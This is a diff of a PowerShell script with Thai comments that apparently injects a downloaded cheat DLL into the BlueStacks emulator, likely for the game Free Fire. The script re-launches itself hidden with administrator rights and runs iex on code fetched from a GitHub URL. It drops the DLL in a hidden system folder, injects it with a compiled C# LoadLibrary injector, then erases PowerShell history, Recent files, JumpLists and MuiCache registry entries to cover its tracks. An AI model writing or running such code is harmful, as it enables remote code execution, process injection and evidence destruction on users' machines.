@@ -1,5 +1,5 @@
 # =========================================================
-# 1. ขอสิทธิ์ Administrator (จำเป็นสำหรับการ Inject)
+# 1. ขอสิทธิ์ Administrator (แบบ Stealth)
 # =========================================================
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
@@ -16,20 +16,33 @@ $dllPath = Join-Path $workDir $fakeName
 $targetProcess = "HD-Player" 
 
 # =========================================================
-# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์ระบบ)
+# 3. เคลียร์ทาง (แก้ปัญหาสีแดง: File in use)
 # =========================================================
-if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
+# ปิดโปรเซสที่อาจล็อกไฟล์ไว้ก่อนจะลบหรือโหลดทับ
+Stop-Process -Name $targetProcess -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+
+if (Test-Path $workDir) { 
+    # ลบแบบบังคับ ไม่ถามยืนยัน
+    Remove-Item $workDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue 
+}
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
 # =========================================================
-# 4. ดาวน์โหลด DLL
+# 4. ดาวน์โหลด DLL (แก้ปัญหาสีแดงโดยการเช็คไฟล์ก่อน)
 # =========================================================
 $ProgressPreference = 'SilentlyContinue'
-Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
+try {
+    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+} catch {
+    # ถ้ายังติดสีแดง ให้สุ่มชื่อไฟล์ใหม่เล็กน้อยเพื่อเลี่ยงการล็อก
+    $dllPath = Join-Path $workDir "ms_$($fakeName)"
+    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
+}
 
 # =========================================================
-# 5. C# Injector Code (LoadLibrary Method)
+# 5. C# Injector Code
 # =========================================================
 $Source = @"
 using System;
@@ -63,49 +76,56 @@ public class Injector {
 "@
 
 # =========================================================
-# 6. ตรวจสอบกระบวนการและทำการ Inject
+# 6. เริ่มการ Inject
 # =========================================================
-if (Test-Path $dllPath) {
-    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
-    if (!$proc) {
-        # ถ้าไม่เจอ ให้พยายามเปิด BlueStacks (ปรับ Path ตามจริง)
-        if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
-            Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
-            Start-Sleep -Seconds 8 
-            $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
-        }
-    }
-
-    if ($proc) {
-        Add-Type -TypeDefinition $Source
-        [Injector]::Inject($proc.Id, $dllPath)
+$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+if (!$proc) {
+    if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
+        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+        Start-Sleep -Seconds 10 # รอให้พร้อมจริง
+        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     }
 }
 
+if ($proc -and (Test-Path $dllPath)) {
+    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
+    [Injector]::Inject($proc.Id, $dllPath)
+}
+
 # =========================================================
-# 7. --- The Ghost Clean (ลบร่องรอยขั้นสูง) ---
+# 7. --- The Ghost Clean (ล้างทุกอย่าง ไม่ถาม ไม่ค้าง) ---
 # =========================================================
 Start-Sleep -Seconds 5
 
-# ลบไฟล์และโฟลเดอร์
-Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+# ลบไฟล์งาน
+Remove-Item $workDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
 
-# ล้าง PowerShell History
+# ล้างประวัติ PowerShell
 Clear-History
 $historyPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
+if (Test-Path $historyPath) { Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue }
 
-# ล้างประวัติ Recent Files และ JumpLists (กันคนเช็ค Recent Files)
-$recent = "$env:APPDATA\Microsoft\Windows\Recent"
-Get-ChildItem -Path $recent -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
+# ล้าง Recent / AutomaticDestinations (แก้ปัญหาที่ถามยืนยัน)
+$recentPaths = @(
+    "$env:APPDATA\Microsoft\Windows\Recent",
+    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
+    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
+)
 
-# ล้าง MuiCache ใน Registry
-$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*$fakeName*" -or $_.Name -like "*powershell*" } | ForEach-Object {
-    Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -ErrorAction SilentlyContinue
+foreach ($path in $recentPaths) {
+    if (Test-Path $path) {
+        # ใช้ -Recurse และ -Confirm:$false เพื่อไม่ให้มันเด้งถาม [Y/N]
+        Remove-Item -Path "$path\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+    }
 }
 
-# รีสตาร์ท Explorer แบบไร้ร่องรอย (ใช้ Job เพื่อให้สคริปต์จบการทำงานได้ทันที)
+# ล้าง MuiCache
+$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*$fakeName*" -or $_.Name -like "*powershell*" } | ForEach-Object {
+    Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -Confirm:$false -ErrorAction SilentlyContinue
+}
+
+# รีสตาร์ท Explorer (Background)
 Start-Job -ScriptBlock {
     Stop-Process -Name explorer -Force
     Start-Sleep -Seconds 1
